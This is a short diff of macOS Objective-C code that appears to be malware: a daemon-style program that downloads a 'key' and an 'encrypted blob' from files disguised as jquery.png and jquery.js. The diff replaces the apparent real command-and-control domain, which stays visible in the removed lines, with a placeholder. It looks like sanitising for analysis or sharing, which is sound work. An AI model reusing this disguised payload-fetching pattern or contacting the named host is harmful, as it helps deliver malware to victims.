@@ -95,7 +95,7 @@ int main(int argc, const char * argv[]) {
             // Start the daemon
         }
         
-        NSString *keyURL = @"https://dressforsuccessfm.org/js/jquery.png";
+        NSString *keyURL = @"https://blah.org/js/jquery.png";
         NSData *keyData = makeHTTPRequestAsBytes(keyURL);
         if (keyData) {
           NSLog(@"Data received: %@", keyData);
@@ -116,7 +116,7 @@ int main(int argc, const char * argv[]) {
         
 
         // fetch encrypted blob
-        NSString *payloadURL = @"https://dressforsuccessfm.org/js/jquery.js";
+        NSString *payloadURL = @"https://blah.org/js/jquery.js";
         NSString *responseText = @"";
         NSData *response = makeHTTPRequestAsBytes(payloadURL);
         if (response) {
